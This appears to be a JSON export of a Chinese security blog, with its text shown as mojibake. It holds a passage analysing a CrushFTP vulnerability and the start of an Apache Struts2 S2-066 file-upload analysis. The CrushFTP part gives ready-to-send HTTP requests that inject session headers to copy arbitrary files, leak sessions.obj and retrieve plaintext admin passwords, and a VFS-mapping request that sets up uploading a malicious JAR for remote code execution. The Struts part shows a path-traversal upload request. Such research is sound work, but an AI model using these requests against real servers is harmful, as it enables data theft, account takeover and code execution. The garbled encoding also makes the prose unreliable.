å¯ä»¥çœ‹åˆ°å¦‚æœå±æ€§å½“ä¸­å­˜åœ¨user_log_path_customï¼Œå¹¶ä¸”ä¸ä¸ºç©ºï¼Œæ¥ä¸‹æ¥å†ç»“åˆè¦†ç›–å…¶ä»–å‚æ•° user_log_path_custom ä¸­çš„å€¼ä¸ºnew_loc user_log_path ä¸­æŒ‡å®šçš„å€¼ä¸ºold_loc æ—§æ–‡ä»¶å°†å¤åˆ¶åˆ°æŒ‡å®šçš„æ–°ä½ç½®ï¼Œå¹¶åˆ é™¤æ—§æ–‡ä»¶ ç°åœ¨æˆ‘ä»¬å¯ä»¥åšåˆ°ä»»æ„æ–‡ä»¶å¤åˆ¶ä»¥åŠåˆ é™¤ï¼Œä½†ç»è¿‡æµ‹è¯•æˆ‘ä»¬ä¼šå‘ç°ï¼Œå¦‚æœæˆ‘ä»¬è¯»å–ä¸€äº›æ•æ„Ÿçš„é…ç½®æ–‡ä»¶åˆ°webè·¯å¾„ä¸‹ï¼Œè®¿é—®åå†ç§»åŠ¨å›å»ä¼šç ´åæ‰æ–‡ä»¶æœ¬èº«çš„ä¸€äº›å®Œæ•´æ€§ 123456789101112131415161718192021222324252627282930313233343536public void drain_log() &#123;.....çœç•¥..... object = this.uiVG(&quot;user_log&quot;); synchronized (object) &#123; if (!this.uiSG(&quot;user_log_path_custom&quot;).equals(&quot;&quot;)) &#123; String new_loc = &quot;&quot; + this.user_info.remove(&quot;user_log_path_custom&quot;); String old_loc = this.uiSG(&quot;user_log_path&quot;); this.uiPUT(&quot;user_log_path&quot;, new_loc); new File_S(Common.all_but_last(String.valueOf(this.uiSG(&quot;user_log_path&quot;)) + this.uiSG(&quot;user_log_file&quot;))).mkdirs(); if (new File_S(String.valueOf(old_loc) + this.uiSG(&quot;user_log_file&quot;)).exists() &amp;&amp; !new File_S(String.valueOf(old_loc) + this.uiSG(&quot;user_log_file&quot;)).renameTo(new File_S(String.valueOf(new_loc) + this.uiSG(&quot;user_log_file&quot;)))) &#123; try &#123; Common.copy(String.valueOf(old_loc) + this.uiSG(&quot;user_log_file&quot;), String.valueOf(new_loc) + this.uiSG(&quot;user_log_file&quot;), true); &#125; catch (Exception exception) &#123; // empty catch block &#125; new File_S(String.valueOf(old_loc) + this.uiSG(&quot;user_log_file&quot;)).delete(); &#125; &#125; try &#123; com.crushftp.client.Common.copyStreams(new ByteArrayInputStream(sb.toString().getBytes(&quot;UTF8&quot;)), new FileOutputStream(new File_S(String.valueOf(this.uiSG(&quot;user_log_path&quot;)) + this.uiSG(&quot;user_log_file&quot;)), true), true, true); &#125; catch (FileNotFoundException e) &#123; try &#123; new File_S(Common.all_but_last(String.valueOf(this.uiSG(&quot;user_log_path&quot;)) + this.uiSG(&quot;user_log_file&quot;))).mkdirs(); com.crushftp.client.Common.copyStreams(new ByteArrayInputStream(sb.toString().getBytes(&quot;UTF8&quot;)), new FileOutputStream(new File_S(String.valueOf(this.uiSG(&quot;user_log_path&quot;)) + this.uiSG(&quot;user_log_file&quot;)), true), true, true); &#125; catch (IOException ee) &#123; Log.log(&quot;SERVER&quot;, 1, ee); &#125; &#125; catch (IOException e) &#123; Log.log(&quot;SERVER&quot;, 1, e); &#125; &#125;&#125; æ¯•ç«Ÿæ˜¯logåŠŸèƒ½ï¼Œç¨‹åºä¼šå°†è¯·æ±‚è®°å½•ä¸æ–­å†™å…¥ è€Œè¿™éƒ¨åˆ†åŠŸèƒ½åˆ™æ˜¯å—add_logæ§åˆ¶ï¼Œå¯ä»¥çœ‹åˆ°å¦‚æœdont_logä¸ºtrueï¼Œé‚£ä¹ˆå°±ä¸ä¼šè®°å½•å½“å‰è¯·æ±‚ 12345678public void add_log(String log_data, String short_data, String check_data) &#123; if (this.uiBG(&quot;dont_log&quot;)) &#123; return; &#125; if (this.logDateFormat == null) &#123; this.logDateFormat = (SimpleDateFormat)ServerStatus.thisObj.logDateFormat.clone(); &#125;....... å› æ­¤æˆ‘ä»¬ä¸éš¾æ„é€ å‡º 12345678910111213POST /WebInterface/function/?command=getUsername&amp;c2f=a4Ga HTTP/1.1Host: 127.0.0.1:8080as2-to: Xuser_name: crushadminuser_log_file: file_to_readuser_log_path_custom: WebInterface/user_log_path: ./dont_log: trueContent-Length: 9Content-Type: application/x-www-form-urlencodedCookie: currentAuth=a4Ga; CrushAuth=1702222555460_GEeImKOtIut9bj65EsoOrsDUAYa4Ga;post=body è¡¨é¢ä¸Šçœ‹æ¥åˆ°æ­¤æ¼æ´å¯èƒ½å·²ç»åˆ©ç”¨ç»“æŸäº†ï¼Œä½†å®é™…ä¸Šè¿˜èƒ½å†æ›´è¿›ä¸€æ­¥ ä½†ç»§ç»­é˜…è¯»æºç æˆ‘ä»¬ä¼šå‘ç°ï¼Œç¨‹åºåœ¨è¿è¡Œè¿‡ç¨‹è¿˜ä¼šâ€å®šæœŸâ€ï¼Œå°†sessionå½“ä¸­çš„å±æ€§ä¿¡æ¯ä¿å­˜åˆ°sessions.objæ–‡ä»¶å½“ä¸­ å†æ¥çœ‹çœ‹å®ƒæ˜¯å¦‚ä½•ç”Ÿæˆçš„,åœ¨crushftp.handlers.SharedSession#flushä¸­å¦‚æœå±æ€§allow_session_caching_memoryä¸ºtrueæ‰ä¼šæ‰§è¡Œï¼Œé»˜è®¤é…ç½®ä¸ºtrue flushçš„è°ƒç”¨åœ¨crushftp.handlers.SharedSession#shutdown 12345678910111213141516171819public static void shutdown() &#123; if (ServerStatus.BG(&quot;allow_session_caching_on_exit&quot;)) &#123; while (ServerStatus.siVG(&quot;user_list&quot;).size() &gt; 0) &#123; Properties user_info = (Properties)ServerStatus.siVG(&quot;user_list&quot;).elementAt(0); SessionCrush thisSession = (SessionCrush)user_info.get(&quot;session&quot;); if (thisSession != null) &#123; thisSession.do_kill(null); &#125; else &#123; ServerStatus.thisObj.remove_user(user_info); &#125; ServerStatus.siVG(&quot;user_list&quot;).remove(user_info); &#125; SharedSession recent_users = SharedSession.find(&quot;recent_user_list&quot;); recent_users.put(&quot;recent_user_list&quot;, ServerStatus.siVG(&quot;recent_user_list&quot;)); recent_users.put(&quot;user_login_num&quot;, ServerStatus.siSG(&quot;user_login_num&quot;)); &#125; shutting_down = true; SharedSession.flush();&#125; shutdownçš„è°ƒç”¨åœ¨crushftp.handlers.ShutdownHandler#runï¼Œå¯ä»¥çœ‹åˆ°åœ¨æ„é€ å‡½æ•°å½“ä¸­ï¼Œä¸ºé€šè¿‡Runtime.getRuntime().addShutdownHook(this)å‘JVMæ³¨å†Œäº†ä¸€ä¸ªå…³é—­æ—¶çš„HookåŠ¨ä½œ 1234567891011121314151617181920212223242526272829303132333435363738394041public class ShutdownHandlerextends Thread &#123; boolean shutdown = false; public ShutdownHandler() &#123; Runtime.getRuntime().addShutdownHook(this); &#125; /* * Unable to fully structure code */ @Override public synchronized void run() &#123; block6: &#123; if (this.shutdown) break block6; AdminControls.stopLogins(new Properties(), &quot;CONNECT)&quot;); start = System.currentTimeMillis(); if (true) ** GOTO lbl13 do &#123; try &#123; Thread.sleep(1000L); &#125; catch (InterruptedException var3_2) &#123; // empty catch block &#125; if (ServerStatus.siVG(&quot;running_tasks&quot;).size() &lt;= 0) break; &#125; while (System.currentTimeMillis() - start &lt; ServerStatus.LG(&quot;active_jobs_shutdown_wait_secs&quot;) * 1000L); SharedSession.shutdown(); ServerStatus.thisObj.statTools.stopDB(); ServerStatus.thisObj.searchTools.stopDB(); &#125; this.shutdown = true; if (ServerStatus.thisObj.loggingProvider1 != null) &#123; ServerStatus.thisObj.loggingProvider1.flushNow(); &#125; if (ServerStatus.thisObj.loggingProvider2 != null) &#123; ServerStatus.thisObj.loggingProvider2.flushNow(); &#125; &#125;&#125; å› æ­¤ä¿å­˜çš„æ¡ä»¶æ˜¯é‡å¯è¿‡æœåŠ¡å™¨â€¦ï¼Œè¿™ä¸ªæ–‡ä»¶çš„ä½œç”¨ç›¸å½“äºæ˜¯å……å½“äº†æœåŠ¡å™¨é‡å¯æ—¶çš„ç¼“å­˜ï¼Œå› æ­¤æ¼æ´åˆ©ç”¨éœ€è¦çœ‹è¿æ°”äº†ï¼Œè¿™é‡Œä¸ºäº†é‡ç°æ¼æ´æˆ‘ä»¬é‡å¯ä¸€ä¸‹ç³»ç»Ÿç”Ÿæˆè¿™ä¸ªæ–‡ä»¶ è¿™é‡Œæˆ‘ä»¬å¾—åˆ°äº†å®Œæ•´çš„æµç¨‹ 12345678910111213POST /WebInterface/function/?command=getUsername&amp;c2f=a4Ga HTTP/1.1Host: 127.0.0.1:8080as2-to: Xuser_name: crushadminuser_log_file: sessions.objuser_log_path_custom: WebInterface/user_log_path: ./dont_log: trueContent-Length: 9Content-Type: application/x-www-form-urlencodedCookie: currentAuth=a4Ga; CrushAuth=1702222555460_GEeImKOtIut9bj65EsoOrsDUAYa4Ga;post=body ä¹‹åè®¿é—®/WebInterface/sessions.obj/WebInterface/sessions.objå³å¯è·å–åˆ°æ³„æ¼çš„sessionä¿¡æ¯ åœ¨è¿™é‡Œæˆ‘ä»¬è¿˜å¯ä»¥å°è¯•æƒé™ç»´æŒï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œå­˜åœ¨ä¸€ä¸ªæ¥å£å¯ä»¥ç›´æ¥è·å–åˆ°æ˜æ–‡å¯†ç  123456if (command.equalsIgnoreCase(&quot;getUser&quot;)) &#123; if (AdminControls.checkRole(command, site, this.thisSessionHTTP.thisSession.uiSG(&quot;user_ip&quot;))) &#123; return this.writeResponse(AdminControls.buildXML(AdminControls.getUser(request, site, this.thisSessionHTTP.thisSession), &quot;user_items&quot;, &quot;OK&quot;), true, 200, false, false, true); &#125; return this.writeResponse(&quot;&lt;commandResult&gt;&lt;response&gt;FAILURE:Access Denied.&lt;/response&gt;&lt;/commandResult&gt;&quot;);&#125; åœ¨AdminControls.getUserå½“ä¸­ï¼Œé€šè¿‡usernameæŸ¥è¯¢åˆ°ç”¨æˆ·ä¿¡æ¯å¹¶è¿”å› åœ¨è¿™é‡Œæ¯”è¾ƒéªšçš„ä¸€ç‚¹ï¼Œç³»ç»Ÿä¼šæŒ‰ç…§passæ‰æ ¼å¼è‡ªé€‚åº”è§£ç ï¼Œå› æ­¤æˆ‘ä»¬æ‹¿åˆ°çš„å¯†ç æ˜¯æ˜æ–‡~~~(Psï¼šå°±ç®—ä¸æ˜¯ä¹Ÿæ— æ‰€è°“é‡Œé¢éƒ½æ˜¯ç¡¬ç¼–ç ) 12345678910111213141516171819public static Object getUser(Properties request, String site, SessionCrush thisSession) &#123;......çœç•¥....... username = thisSession.uiSG(&quot;user_name&quot;);......çœç•¥....... VFS uVFS = UserTools.ut.getVFS(request.getProperty(&quot;serverGroup&quot;), username); Properties new_user = UserTools.ut.getUser(request.getProperty(&quot;serverGroup&quot;), username, false);......çœç•¥....... String pass = new_user.getProperty(&quot;password&quot;, &quot;&quot;); if (!(pass.startsWith(&quot;SHA:&quot;) || pass.startsWith(&quot;SHA512:&quot;) || pass.startsWith(&quot;SHA256:&quot;) || pass.startsWith(&quot;SHA3:&quot;) || pass.startsWith(&quot;MD5:&quot;) || pass.startsWith(&quot;CRYPT3:&quot;) || pass.startsWith(&quot;BCRYPT:&quot;) || pass.startsWith(&quot;MD5CRYPT:&quot;) || pass.startsWith(&quot;PBKDF2SHA256:&quot;) || pass.startsWith(&quot;SHA512CRYPT:&quot;) || pass.startsWith(&quot;ARGOND:&quot;))) &#123; pass = ServerStatus.thisObj.common_code.decode_pass(pass); new_user.put(&quot;password&quot;, pass); &#125; else &#123; new_user.put(&quot;password&quot;, &quot;SHA3:XXXXXXXXXXXXXXXXXXXX&quot;); &#125; if (!new_user.getProperty(&quot;userVersion&quot;, &quot;&quot;).equals(&quot;6&quot;) &amp;&amp; !new_user.getProperty(&quot;as2EncryptKeystorePassword&quot;, &quot;&quot;).equals(&quot;&quot;)) &#123; new_user.put(&quot;as2EncryptKeystorePassword&quot;, ServerStatus.thisObj.common_code.encode_pass(new_user.getProperty(&quot;as2EncryptKeystorePassword&quot;, &quot;&quot;), &quot;DES&quot;, &quot;&quot;)); new_user.put(&quot;as2EncryptKeyPassword&quot;, ServerStatus.thisObj.common_code.encode_pass(new_user.getProperty(&quot;as2EncryptKeyPassword&quot;, &quot;&quot;), &quot;DES&quot;, &quot;&quot;)); &#125;......çœç•¥....... ç®€å•å‘åŒ…åšä¸ªéªŒè¯ åå°ä»£ç æ‰§è¡Œåœ¨åå°è®¾ç½®ä¸­ï¼Œå‘ç°å¯ä»¥åŠ¨æ€åŠ è½½ SQL é©±åŠ¨ç¨‹åºå’Œé…ç½®æµ‹è¯•ï¼Œå› æ­¤åªéœ€è¦èƒ½å¤Ÿä¸Šä¼ æ¶æ„ JAR æ–‡ä»¶å³å¯å®ç°RCE æ¯•ç«Ÿæ˜¯FTPä¸€å®šå­˜åœ¨ä¸Šä¼ çš„ç‚¹ï¼Œä½†æ˜¯åœ¨ä¸Šä¼ åå‘ç°æ²¡æœ‰æƒé™ ç»è¿‡æŸ¥æ‰¾æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨åå°å¯ä»¥å¢åŠ è™šæ‹Ÿè·¯å¾„å’Œç‰©ç†è·¯å¾„çš„æ˜ å°„ é¡ºä¾¿æŠ“äº†ä¸ªåŒ… 1command=setUserItem&amp;data_action=replace&amp;serverGroup=extra_vfs&amp;username=crushadmin~Y4Test&amp;user=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%3Cuser+type%3D%22properties%22%3E%3Cusername%3Ecrushadmin~Y4Test%3C%2Fusername%3E%3Cpassword%3E%3C%2Fpassword%3E%3Cmax_logins%3E0%3C%2Fmax_logins%3E%3Croot_dir%3E%2F%3C%2Froot_dir%3E%3C%2Fuser%3E&amp;xmlItem=user&amp;vfs_items=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%0D%0A%3Cvfs_items+type%3D%22vector%22%3E%0D%0A%3Cvfs_items_subitem+type%3D%22properties%22%3E%0D%0A%3Cname%3EY4TMP%3C%2Fname%3E%0D%0A%3Cpath%3E%2F%3C%2Fpath%3E%0D%0A%3Cvfs_item+type%3D%22vector%22%3E%0D%0A%3Cvfs_item_subitem+type%3D%22properties%22%3E%0D%0A%3Ctype%3EDIR%3C%2Ftype%3E%0D%0A%3Curl%3E%3C%2Furl%3E%0D%0A%3C%2Fvfs_item_subitem%3E%0D%0A%3C%2Fvfs_item%3E%0D%0A%3C%2Fvfs_items_subitem%3E%0D%0A%3Cvfs_items_subitem+type%3D%22properties%22%3E%0D%0A%3Cname%3Etmp%3C%2Fname%3E%0D%0A%3Cpath%3E%2FY4TMP%2F%3C%2Fpath%3E%0D%0A%3Cvfs_item+type%3D%22vector%22%3E%0D%0A%3Cvfs_item_subitem+type%3D%22properties%22%3E%0D%0A%3Ctype%3EDIR%3C%2Ftype%3E%0D%0A%3Curl%3EFILE%3A%2F%2FVolumes%2FMacintosh+HD%2Ftmp%2F%3C%2Furl%3E%0D%0A%3C%2Fvfs_item_subitem%3E%0D%0A%3C%2Fvfs_item%3E%0D%0A%3C%2Fvfs_items_subitem%3E%0D%0A%3C%2Fvfs_items%3E&amp;permissions=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%0D%0A%3CVFS+type%3D%22properties%22%3E%0D%0A%3Citem+name%3D%22%2F%22%3E(read)(view)(resume)%3C%2Fitem%3E%0D%0A%3Citem+name%3D%22%2FY4TMP%2F%22%3E(read)(view)(resume)%3C%2Fitem%3E%0D%0A%3Citem+name%3D%22%2FY4TMP%2FTMP%2F%22%3E(read)(write)(view)(delete)(deletedir)(makedir)(rename)(resume)(share)%3C%2Fitem%3E%0D%0A%3C%2FVFS%3E&amp;c2f=kYjk å¯¹åº”ä»¥ä¸‹çš„å‚æ•°ï¼ŒæŒ‰ç…§æ­¤æ¨¡æ¿åšä¿®æ”¹å³å¯æ³¨æ„æ›¿æ¢username(ç”¨æˆ·å~éšæ„çš„è‡ªå®šä¹‰å‚æ•°|å‚è€ƒä¸Šé¢çš„å›¾ä¸Šé¢çš„æˆªå›¾å°±å¾ˆå®¹æ˜“ç†è§£)ã€c2få‚æ•°å³å¯ 123456789101112131415161718192021222324252627282930313233343536command: setUserItemdata_action: replaceserverGroup: extra_vfsusername: crushadmin~Y4Testuser: &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;user type=&quot;properties&quot;&gt;&lt;username&gt;crushadmin~Y4Test&lt;/username&gt;&lt;password&gt;&lt;/password&gt;&lt;max_logins&gt;0&lt;/max_logins&gt;&lt;root_dir&gt;/&lt;/root_dir&gt;&lt;/user&gt;xmlItem: uservfs_items: &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;vfs_items type=&quot;vector&quot;&gt;&lt;vfs_items_subitem type=&quot;properties&quot;&gt;&lt;name&gt;Y4TMP&lt;/name&gt;&lt;path&gt;/&lt;/path&gt;&lt;vfs_item type=&quot;vector&quot;&gt;&lt;vfs_item_subitem type=&quot;properties&quot;&gt;&lt;type&gt;DIR&lt;/type&gt;&lt;url&gt;&lt;/url&gt;&lt;/vfs_item_subitem&gt;&lt;/vfs_item&gt;&lt;/vfs_items_subitem&gt;&lt;vfs_items_subitem type=&quot;properties&quot;&gt;&lt;name&gt;tmp&lt;/name&gt;&lt;path&gt;/Y4TMP/&lt;/path&gt;&lt;vfs_item type=&quot;vector&quot;&gt;&lt;vfs_item_subitem type=&quot;properties&quot;&gt;&lt;type&gt;DIR&lt;/type&gt;&lt;url&gt;FILE://Volumes/Macintosh HD/tmp/&lt;/url&gt;&lt;/vfs_item_subitem&gt;&lt;/vfs_item&gt;&lt;/vfs_items_subitem&gt;&lt;/vfs_items&gt;permissions: &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;VFS type=&quot;properties&quot;&gt;&lt;item name=&quot;/&quot;&gt;(read)(view)(resume)&lt;/item&gt;&lt;item name=&quot;/Y4TMP/&quot;&gt;(read)(view)(resume)&lt;/item&gt;&lt;item name=&quot;/Y4TMP/TMP/&quot;&gt;(read)(write)(view)(delete)(deletedir)(makedir)(rename)(resume)(share)&lt;/item&gt;&lt;/VFS&gt;c2f: kYjk ä¹‹ååœ¨ä¸»é¡µä¸Šä¼ jaråŒ… æŠ“äº†ä¸ªåŒ…å‘ç°è¿™æ ·éå¸¸éº»çƒ¦ï¼Œéœ€è¦ä¸¤æ­¥ï¼Œç¬¬ä¸€æ­¥ç›¸å½“äºåˆå§‹åŒ–ï¼Œç¬¬äºŒæ­¥è¿˜è¦è®¡ç®—æ–‡ä»¶å¤§å°æ‹¼æ¥(19218æ˜¯æ–‡ä»¶å¤§å°) é€šè¿‡é˜…è¯»æºç æˆ‘å‘ç°äº†ä¸€ä¸ªå¯æ›¿ä»£çš„æ­¥éª¤ï¼Œå¹¶ä¸”æ›´ç®€å•ï¼Œç®€åŒ–æˆ‘ä»¬åšè‡ªåŠ¨åŒ–åˆ©ç”¨çš„æ­¥éª¤ ç°åœ¨æ—¢ç„¶æˆåŠŸä¸Šä¼ äº†ï¼Œé‚£å°±å¯ä»¥æ§åˆ¶å‚æ•°åŠ è½½æˆ‘ä»¬çš„æ¶æ„SQLé©±åŠ¨ç¨‹åºæ‰§è¡Œä»»æ„å‘½ä»¤","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"CrushFTP","slug":"CrushFTP","permalink":"https://y4tacker.github.io/tags/CrushFTP/"}]},{"title":"Apache Struts2 æ–‡ä»¶ä¸Šä¼ åˆ†æ(S2-066)","slug":"year/2023/12/Apache-Struts2-æ–‡ä»¶ä¸Šä¼ åˆ†æ-S2-066","date":"2023-12-09T10:55:03.000Z","updated":"2024-08-04T09:01:49.778Z","comments":true,"path":"2023/12/09/year/2023/12/Apache-Struts2-æ–‡ä»¶ä¸Šä¼ åˆ†æ-S2-066/","link":"","permalink":"https://y4tacker.github.io/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/","excerpt":"","text":"Apache Struts2 æ–‡ä»¶ä¸Šä¼ åˆ†æ(S2-066)struts2ä¹Ÿå¾ˆä¹…æ²¡å‡ºè¿‡æ¼æ´äº†å§ï¼Œè¿™æ¬¡çˆ†çš„æ˜¯å’Œæ–‡ä»¶ä¸Šä¼ ç›¸å…³ ç›¸å…³çš„commitåœ¨https://github.com/apache/struts/commit/162e29fee9136f4bfd9b2376da2cbf590f9ea163 é¦–å…ˆä»commitå¯ä»¥çœ‹å‡ºï¼Œæ¼æ´å’Œå¤§å°å†™å‚æ•°æœ‰å…³ï¼Œåé¢ä¼šå…·ä½“è°ˆåŠ åŒæ—¶ç»“åˆCVEæè¿°æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œå¤§æ¦‚å’Œè·¯å¾„ç©¿è¶Šæœ‰å…³ 1An attacker can manipulate file upload params to enable paths traversal and under some circumstances this can lead to uploading a malicious file which can be used to perform Remote Code Execution. Users are recommended to upgrade to versions Struts 2.5.33 or Struts 6.3.0.2 or greater to fix this issue. ç¯å¢ƒè¿™é‡Œæˆ‘ä»¥6.3.0ä¸ºä¾‹æ­å»º 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.struts&lt;/groupId&gt; &lt;artifactId&gt;struts2-core&lt;/artifactId&gt; &lt;version&gt;6.3.0&lt;/version&gt;&lt;/dependency&gt; å®šä¹‰ä¸€ä¸ªUploadAction 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758package com.struts2;import com.opensymphony.xwork2.ActionSupport;import org.apache.commons.io.FileUtils;import org.apache.struts2.ServletActionContext;import java.io.*;public class UploadAction extends ActionSupport &#123; private static final long serialVersionUID = 1L; private File upload; // æ–‡ä»¶ç±»å‹ï¼Œä¸ºnameå±æ€§å€¼ + ContentType private String uploadContentType; // æ–‡ä»¶åç§°ï¼Œä¸ºnameå±æ€§å€¼ + FileName private String uploadFileName; public File getUpload() &#123; return upload; &#125; public void setUpload(File upload) &#123; this.upload = upload; &#125; public String getUploadContentType() &#123; return uploadContentType; &#125; public void setUploadContentType(String uploadContentType) &#123; this.uploadContentType = uploadContentType; &#125; public String getUploadFileName() &#123; return uploadFileName; &#125; public void setUploadFileName(String uploadFileName) &#123; this.uploadFileName = uploadFileName; &#125; public String doUpload() &#123; String path = ServletActionContext.getServletContext().getRealPath(&quot;/&quot;)+&quot;upload&quot;; String realPath = path + File.separator +uploadFileName; try &#123; FileUtils.copyFile(upload, new File(realPath)); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return SUCCESS; &#125;&#125; åœ¨struts.xmlå½“ä¸­ï¼Œé€šå¸¸é»˜è®¤é…ç½®ä¸‹è¿™ä¸ªæ–‡ä»¶åœ¨é¡¹ç›®è·¯å¾„çš„/WEB-INF/classesè·¯å¾„ä¸‹ 123456789101112&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE struts PUBLIC &quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot; &quot;http://struts.apache.org/dtds/struts-2.0.dtd&quot;&gt;&lt;struts&gt; &lt;package name=&quot;upload&quot; extends=&quot;struts-default&quot;&gt; &lt;action name=&quot;upload&quot; class=&quot;com.struts2.UploadAction&quot; method=&quot;doUpload&quot;&gt; &lt;result name=&quot;success&quot; type=&quot;&quot;&gt;/index.jsp&lt;/result&gt; &lt;/action&gt; &lt;/package&gt;&lt;/struts&gt; ä»¥åŠåœ¨web.xmlå½“ä¸­é…ç½®å¥½filter 12345678&lt;filter&gt; &lt;filter-name&gt;struts2&lt;/filter-name&gt; &lt;filter-class&gt;org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter&lt;/filter-class&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;struts2&lt;/filter-name&gt; &lt;url-pattern&gt;*.action&lt;/url-pattern&gt;&lt;/filter-mapping&gt; åˆ†æä»æ–‡ä»¶ä¸Šä¼ çš„Actionä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œstruts2å½“ä¸­ï¼Œæ–‡ä»¶ä¸Šä¼ çš„è¿‡ç¨‹ä¸»è¦æ¶‰åŠåˆ°ä¸¤ä¸ªé‡è¦å‚æ•°ï¼Œä»¥æˆ‘çš„ç¯å¢ƒå‘½åä¸ºä¾‹uploadä»¥åŠuploadFileName ä¸Šé¢æè¿°å¯çŸ¥æ­¤æ¼æ´ä¸ºè·¯å¾„ç©¿è¶Šï¼Œè€Œæˆ‘ä»¬çŸ¥é“Struts2æœ¬èº«æ˜¯æœ‰ä¸€ç³»åˆ—é»˜è®¤æ‹¦æˆªå™¨ï¼Œè¿™éƒ¨åˆ†é…ç½®åœ¨struts-default.xmlä¸­ï¼Œå…¶ä¸­å°±åŒ…å«äº†ä¸€ä¸ªä¸æ–‡ä»¶ä¸Šä¼ ç›¸å…³çš„æ‹¦æˆªå™¨org.apache.struts2.interceptor.FileUploadInterceptor æˆ‘ä»¬å…ˆæ¥æµ‹è¯•ä¸€ä¸‹æ–‡ä»¶ä¸Šä¼  123456789101112131415POST /upload.action HTTP/1.1Host: 127.0.0.1Accept: */*Accept-Encoding: gzip, deflateContent-Length: 188Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWNUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWNContent-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;../1.txt&quot;Content-Type: text/plain1aaa--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN-- å‘ç°è½åœ°çš„æ–‡ä»¶åå­—å˜æˆäº†1.txt æˆ‘ä»¬ç®€å•æ¥åšä¸ªdebugï¼Œçœ‹çœ‹æ–‡ä»¶ä¸Šä¼ çš„å¤„ç†æµç¨‹ é¦–å…ˆåœ¨org.apache.struts2.interceptor.FileUploadInterceptor#interceptä¸­ è·å–æ–‡ä»¶åé€šè¿‡multiWrapper.getFileNamesåšå¤„ç† æœ€ç»ˆæ˜¯ç”±org.apache.struts2.dispatcher.multipart.AbstractMultiPartRequest#getCanonicalNameåšæ–‡ä»¶åå¤„ç†ï¼Œä»¥ä¸‹æ˜¯éƒ¨åˆ†è°ƒè¯•æ ˆï¼Œæœ‰å…´è¶£çš„å¯ä»¥è‡ªè¡Œdebug 1234getCanonicalName:162, AbstractMultiPartRequest (org.apache.struts2.dispatcher.multipart)getFileNames:265, JakartaMultiPartRequest (org.apache.struts2.dispatcher.multipart)getFileNames:159, MultiPartRequestWrapper (org.apache.struts2.dispatcher.multipart)intercept:279, FileUploadInterceptor (org.apache.struts2.interceptor) è¿™éƒ¨åˆ†ä»£ç å¾ˆç›´ç™½ï¼Œæ‹¦æˆªäº†è·¯å¾„ç©¿è¶Š 123456789101112protected String getCanonicalName(final String originalFileName) &#123; String fileName = originalFileName; int forwardSlash = fileName.lastIndexOf(&#x27;/&#x27;); int backwardSlash = fileName.lastIndexOf(&#x27;\\\\&#x27;); if (forwardSlash != -1 &amp;&amp; forwardSlash &gt; backwardSlash) &#123; fileName = fileName.substring(forwardSlash + 1); &#125; else &#123; fileName = fileName.substring(backwardSlash + 1); &#125; return fileName; &#125; ç»§ç»­å›åˆ°FileUploadInterceptorå½“ä¸­ï¼Œå¤„ç†å®Œæ–‡ä»¶åï¼Œä¼šæŠŠä¸€äº›ä¿¡æ¯ä¿å­˜åˆ°acceptedFiles/acceptedContentTypes/acceptedFileNamesä¸­ï¼Œä»ä¸‹é¢çš„fileNameNameä¹Ÿå¯ä»¥çœ‹å‡ºä¸ºä»€ä¹ˆæˆ‘ä»¬çš„Actionä¸€å®šè¦é‚£æ ·å‘½åä¸Šä¼ çš„æ–‡ä»¶å å†å¾€ä¸‹å°†è¿™äº›å‚æ•°ä¿å­˜åˆ°äº†org.apache.struts2.dispatcher.HttpParameterså¯¹è±¡å½“ä¸­ æ—¢ç„¶æ˜¯ä¿å­˜åˆ°äº†HttpParameterå‚æ•°ä¸­ï¼Œç»“åˆCommitå½“ä¸­çš„ä¸€äº›è®¯æ¯ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¾ˆå®¹æ˜“æœ‰ä¸ªæ€è€ƒï¼Œæ—¢ç„¶æ˜¯HttpParameterï¼Œæ˜¯ä¸æ˜¯å­˜åœ¨å…¶ä»–ä¼ å‚çš„è¿‡ç¨‹èƒ½å¤Ÿåšå˜é‡è¦†ç›– ä»ä¸Šé¢çš„å›¾ç‰‡åšæ·±å…¥åˆ†æ,æˆ‘ä»¬å¯ä»¥çŸ¥é“ac.getParameters()è·å–åˆ°çš„HttpParameterå¯¹è±¡æ˜¯ä»ä¸Šä¸‹æ–‡è·å–çš„ ä¸Šä¸‹æ–‡çš„åˆ›å»ºåœ¨org.apache.struts2.dispatcher.Dispatcher#serviceAction åœ¨åˆ›å»ºä¸Šä¸‹æ–‡çš„è¿‡ç¨‹å½“ä¸­æˆ‘ä»¬å‘ç°ï¼Œè°ƒç”¨äº†HttpParameters.createå°†è¯·æ±‚çš„å‚æ•°ä¿å­˜åˆ°äº†å½“ä¸­ 